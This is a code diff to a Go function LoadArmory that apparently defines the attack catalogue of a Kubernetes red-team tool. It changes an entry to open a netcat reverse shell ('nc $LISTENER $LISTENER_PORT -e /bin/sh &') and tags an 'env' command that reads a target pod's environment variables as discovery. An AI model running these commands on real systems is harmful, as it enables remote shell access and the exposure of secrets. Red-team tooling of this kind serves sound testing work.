@@ -121,39 +121,26 @@ func LoadArmory(dir string) (Armory, error) {
 			Requires: domain.Requirements{Kind: "ServiceAccount"},
 		},
 		{
-			Name:        "Kubectl Exec simple shell",
-			Description: "Use kubectl exec to establish a simple shell",
+			Name:        "Start Netcat shell",
+			Description: "Establish a simple shell using netcat",
 			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
 			Tactics:     []string{"Execution"},
-			Requires:    domain.Requirements{Infra: []string{"Listener"}},
+			Requires:    domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
 		},
-		// ExecSimpleReverseShell{
-		// 	TTPMeta: TTPMeta{
-		// 		Title:       "Start simple reverse shell",
-		// 		Description: "Establish",
-		// 	},
-		// Cmd: "nc $LISTENER $LISTENER_PORT -e /bin/bash",
-		// },
 		{
 			Name:          "Read Environment Variables",
 			Description:   "Read environment variables from a target",
-			ResultHandler: handleEnvVarResult,
-			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ReadEnvVars{
-					Target: domain.Target{
-						Id:   t.TargetId,
-						Name: t.Target,
-						Ns:   t.TargetNamespace,
-					},
-				}
-			},
-		},
-		{
-			Name:          "Kubectl Exec Env",
-			Description:   "Use kubectl exec to read environment variables of a pod",
-			ResultHandler: handleEnvVarResult,
+			Tactics:       []string{"Discovery"},
+			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
 			Cmd:           "env",
+			ResultHandler: handleEnvVarResult,
 		},
+		// {
+		// 	Name:          "Kubectl Exec Env",
+		// 	Description:   "Use kubectl exec to read environment variables of a pod",
+		// 	ResultHandler: handleEnvVarResult,
+		// 	Cmd:           "env",
+		// },
 	}
 
 	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
